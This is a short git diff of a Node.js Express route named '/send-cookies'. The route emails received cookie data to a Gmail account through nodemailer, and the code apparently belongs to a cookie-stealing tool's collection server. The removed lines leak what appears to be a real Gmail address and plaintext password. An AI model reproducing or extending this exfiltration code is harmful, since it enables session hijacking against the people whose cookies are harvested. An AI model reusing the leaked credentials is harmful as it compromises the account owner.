@@ -13,14 +13,14 @@ app.post('/send-cookies', (req, res) => {
     const transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
-            user: 'galangsurya289@gmail.com',  // Ganti dengan alamat email Anda
-            pass: 'galangsurya1309'     // Ganti dengan password email Anda
+            user: '@gmail.com',  // Ganti dengan alamat email Anda
+            pass: ''     // Ganti dengan password email Anda
         }
     });
 
     const mailOptions = {
-        from: 'galangsurya289@gmail.com',  // Ganti dengan alamat email Anda
-        to: 'galangsurya1309',    // Ganti dengan alamat email Anda
+        from: '9@gmail.com',  // Ganti dengan alamat email Anda
+        to: '',    // Ganti dengan alamat email Anda
         subject: 'Cookies',
         text: cookies
     };
